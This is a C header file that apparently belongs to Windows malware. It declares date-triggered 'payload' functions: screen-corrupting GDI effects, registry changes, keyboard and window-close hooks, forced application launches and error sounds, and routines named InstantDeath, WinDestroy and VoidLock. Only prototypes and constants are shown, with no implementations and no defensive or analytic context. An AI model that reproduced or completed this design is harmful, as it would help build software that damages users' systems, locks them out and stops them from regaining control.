#pragma once
#include <windows.h>
#include <Winbase.h>
#include <processthreadsapi.h>
#include <securitybaseapi.h>
#include <synchapi.h>
#include <userenv.h>
#include <lmaccess.h>
#include <minwinbase.h>
#include <winuser.h>
#include <sysinfoapi.h>
#include <wingdi.h>
#include <fileapi.h>
#include <winreg.h>
#include <shlobj.h>
#include <shlobj_core.h>
#include <Shobjidl.h>
#include <shobjidl_core.h>
#include <processenv.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>
#include <strsafe.h>
#include <shellapi.h>
#include <memory.h> // If memset Or Other Related Functions Are Used.
#include <sddl.h>
#include <BaseTsd.h>
#include <utilapiset.h>
#include <Lm.h>
#include <time.h>
#include <winnt.h>

#pragma comment(lib, "Winmm.lib")
// And Every Other #includes In Original Code.
#define CCHWRITEFILEBUFF 666000
#define ERODE SRCAND
#define CATWRITEMAXCCH 666000
#define SATURNICDEATH SRCPAINT
#define NEPTUNICDEATH NOTSRCCOPY // Change This If You Want.
#define SONICDEATH SRCINVERT
#define SATURN WINAPI

typedef BYTE HEX;
typedef HANDLE HTHREAD;

extern CONST LPSTR CatWrite;
extern CONST LPSTR Writebuff;
extern CONST CHAR goodluck[10];

extern CONST CHAR *sites[];
extern CONST CHAR *progs[];
extern CONST CHAR *sounds[];
extern CONST CHAR *augustgdi[];
extern CONST HEX scankeysarray[];

extern CONST SIZE_T nSites;
extern CONST SIZE_T nProgs;
extern CONST SIZE_T nSounds;
extern CONST SIZE_T nAugustGDI;
extern CONST SIZE_T scankeysarray_len;

// Miscellaneous Payload Function Prototypes.
// If Registry Changes Is Used As A Thread: DWORD WINAPI ApplyRegistryChanges(LPVOID parameter); Code Should Be Used.
INT FindProcessId(CONST CHAR *procname);
DWORD WINAPI ApplyRegistryChanges();
wchar_t* SaturnGenerateRandomUnicodeString(SIZE_T len, SIZE_T start, SIZE_T end);
INT random();

// January 14th Payload Function Prototypes.
DWORD SATURN SaturnFlashWindows(LPVOID parameter);
BOOL CALLBACK FlashEnumChildProc(HWND hWindow, LPARAM lParam);
DWORD SATURN JanuaryGDI(LPVOID parameter);

// October 21st Payload Function Prototypes.
DWORD WINAPI MoveIconsGDI(LPVOID parameter);

// March 9th Payload Function Prototypes.
DWORD WINAPI MarchGDI(LPVOID parameter);

// August 8th Function Prototypes.
DWORD WINAPI SaturnTimeCurse(LPVOID parameter);
DWORD WINAPI SaturnReverseWindowText(LPVOID parameter);
BOOL CALLBACK EnumChildProc(HWND hWindow, LPARAM lParam);
VOID WINAPI SaturnStrReverseW(LPWSTR str);
DWORD WINAPI SaturnRandomSearches(LPVOID parameter);
DWORD WINAPI SaturnRandomApplicationStart(LPVOID parameter);
DWORD WINAPI SaturnPlayErrorSounds(LPVOID parameter);
DWORD WINAPI SCatGDI(LPVOID parameter);

// Hook Required Functions.
DWORD WINAPI SonicRestart();
DWORD WINAPI SonicDeath();
DWORD WINAPI SlowDeath();
DWORD WINAPI InstantDeath();
DWORD WINAPI WinDestroy();
DWORD WINAPI VoidLock();

// SaturnKeyboardHook And CloseWNDCheckHook.
LRESULT CALLBACK SaturnKeyboardHook(INT code, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK CloseWndCheckHook(INT nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK AltSaturnKeyboardHook(INT code, WPARAM wParam, LPARAM lParam);